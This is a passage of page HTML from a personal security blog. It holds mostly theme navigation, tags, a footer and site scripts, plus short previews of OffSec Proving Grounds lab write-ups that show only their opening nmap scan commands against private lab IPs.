href="/blog/posts/homelab-linkwarden/">Bookmark Manager in Home Lab</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/seed-labs/">seed-labs</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/oscp-pg-set6/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Potato, PyExp, Sar, Seppukku</h4><div class="text-muted"><p>Potato Enumeration Machine IP → 192.168.53.101 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set5/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</h4><div class="text-muted"><p>NoName Enumeration Machine IP → 192.168.225.15 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15 OS Detection → os_info Port Service Other de...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set4/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Katana, Lampiao, Loly, Monitoring</h4><div class="text-muted"><p>Katana Enumeration Machine IP → 192.168.51.83 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83 OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/oscp-pg-set2/" class="btn btn-outline-primary" aria-label="Older" ><p>OffSec PG - FunBox - Easy, Enum, Rookie</p></a> <a href="/blog/posts/oscp-pg-set4/" class="btn btn-outline-primary" aria-label="Newer" ><p>OffSec PG - Katana, Lampiao, Loly, Monitoring</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/seed-labs/">seed-labs</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.29.0/dist/tocbot.min.js"></script> <script src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.min.js?baseurl=/blog&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener('DOMContentLoaded', function (event) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
